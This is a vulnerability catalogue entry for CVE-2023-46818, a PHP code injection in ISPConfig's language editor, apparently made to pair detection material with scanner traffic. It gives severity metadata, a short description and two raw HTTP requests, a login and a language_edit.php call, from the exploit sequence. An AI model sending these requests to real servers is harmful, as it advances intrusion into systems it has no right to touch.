---
layout: "post"
cve_id: "CVE-2023-46818"
title: "ISPConfig - PHP Code Injection"
pcap: true
pcap_path: "/pcaps/2023/CVE-2023-46818.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-46818.yaml"
author: "non-things"
severity: "high"
reference:
  - "https://www.ispconfig.org/blog/ispconfig-3-2-11p1-released/"
  - "http://packetstormsecurity.com/files/176126/ISPConfig-3.2.11-PHP-Code-Injection.html"
  - "http://seclists.org/fulldisclosure/2023/Dec/2"
  - "https://nvd.nist.gov/vuln/detail/CVE-2023-46818"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
  cvss-score: 7.2
  cve-id: "CVE-2023-46818"
  cwe-id: "CWE-94"
  epss-score: 0.89267
  epss-percentile: 0.99512
metadata:
  verified: True
  max-request: 1
  product: "ispconfig"
tags:
  - "cve"
  - "cve2023"
  - "ispconfig"
  - "php"
  - "rce"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## üîç Vulnerability Description
An issue was discovered in ISPConfig before 3.2.11p1. PHP code injection can be achieved in the language file editor by an admin if admin_allow_langedit is enabled.


## üåê HTTP Request
```nohighlight
POST /login/index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063
Connection: close
Content-Length: 45
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

username=VhLTCy&password=DQQMylw3&s_mod=login
```

```nohighlight
POST /admin/language_edit.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
Connection: close
Content-Length: 60
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

lang=en&module=help&lang_file=pinBhNcGvcynSTmNwLLBEzgxBI.lng
```


